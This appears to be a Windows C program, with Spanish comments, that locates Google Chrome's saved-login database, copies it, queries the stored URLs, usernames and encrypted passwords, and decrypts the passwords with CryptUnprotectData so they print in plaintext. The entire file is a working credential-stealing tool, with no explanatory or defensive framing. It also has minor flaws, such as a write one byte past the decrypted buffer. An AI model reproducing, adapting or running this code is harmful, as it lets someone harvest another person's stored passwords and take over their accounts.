#include<ctype.h>
#include<stdio.h>
#include<stdlib.h>
#include "sqlite3.h"
#include<Windows.h>
#include<Wincrypt.h>
#include <ShlObj.h>
#include <stdbool.h>
#include <assert.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "Ole32.lib") // Kernel32.lib

#define TEMP_DB "copia"
#define CHROME_PATH  L"\\Google\\Chrome\\User Data\\Default\\Login Data"
#define ARRAY_SIZE(x) (sizeof(x)/sizeof(x[0]))

static const char *format_error(DWORD err_code) {

    return NULL;
}

static int error(const char *string) {
    fprintf(stderr,"%s",string);
    return -1;
}

static bool chrome_database_path(WCHAR *buffer, size_t bufferLen) {
    PWSTR path = NULL;
    if(SHGetKnownFolderPath(&FOLDERID_LocalAppData,0,NULL,&path) != S_OK) {
        return false;
    }
    int ret = _snwprintf (buffer,bufferLen,TEXT("%s%s"),path,CHROME_PATH);
    assert(ret <= bufferLen);
    CoTaskMemFree(path);
    return true;   
}

static int open_database_and_prepare_statement(const char *db_path, sqlite3 **db, sqlite3_stmt **smt) {
    const char *sql="SELECT origin_url, username_value, password_value FROM logins";
    int ret = sqlite3_open_v2(db_path, db, SQLITE_OPEN_READONLY, NULL);
    if(ret) {
        return error("open error db\n");
    }
    ret = sqlite3_prepare_v2(*db,sql,-1,smt,0);
    if(ret != SQLITE_OK) {
        return error("Error in prepare statement\n");
    }
    return 0;
}

static void print(const char *url, const char *user, const char *pass) {
    printf("%s -> %s -> %s\n",url,user,pass);
}

//typedef void(*ptr)(const char *url, const char *username, const char *password);
static void show_chrome_credential(sqlite3_stmt *smt, void (*callback)(const char *url, const char *username, const char *password)) {
    #define COL_URL 0
    #define COL_USERNAME 1
    #define COL_PASSWORD 2
    while (sqlite3_step(smt) == SQLITE_ROW) {
        DATA_BLOB encrypted_pass,decryptedpass;
        encrypted_pass.cbData = (DWORD)sqlite3_column_bytes(smt,COL_PASSWORD);
        encrypted_pass.pbData = (byte*)malloc(encrypted_pass.cbData+1); // +1 for NUL
        memcpy(encrypted_pass.pbData,sqlite3_column_blob(smt,COL_PASSWORD),encrypted_pass.cbData);
        CryptUnprotectData(&encrypted_pass,NULL,NULL,NULL,NULL,0,&decryptedpass);

        decryptedpass.pbData[decryptedpass.cbData] = '\0';
        callback(sqlite3_column_text(smt,COL_URL),sqlite3_column_text(smt,COL_USERNAME),decryptedpass.pbData);
        free(decryptedpass.pbData);
        decryptedpass.pbData = NULL;
    }
}

static void get_chrome_credential(const char *db_path, void (*callback)(const char *url, const char *username, const char *password)) {
    sqlite3 *db;
    sqlite3_stmt *smt;
    int ret = open_database_and_prepare_statement(TEMP_DB,&db,&smt);
    if(ret == SQLITE_OK) {
        show_chrome_credential(smt,callback);
    }
    sqlite3_finalize(smt);
    sqlite3_close(db);
}

int main()
{
    // get directory path
    WCHAR absolute_path[MAX_PATH] = {0};
    //size_t size = sizeof(absolute_path); // WRONG!!!! da un tamaño diferente
    // size_t size = ARRAY_SIZE(absolute_path); // ok
    if(!chrome_database_path(absolute_path,ARRAY_SIZE(absolute_path))) {
        return error("No se pudo obtener la ruta\n");
    }
    //wprintf(TEXT("%s\n"),absolute_path);
    if(!CopyFile(absolute_path,TEXT(TEMP_DB),FALSE)) {
        return error("No se pudo copiar el archivo\n");
    }
   
    get_chrome_credential(TEMP_DB,print);

    if(!DeleteFileA(TEMP_DB)) {
        return error("No se pudo eliminar el archivo\n");
    }
    
    return EXIT_SUCCESS;
}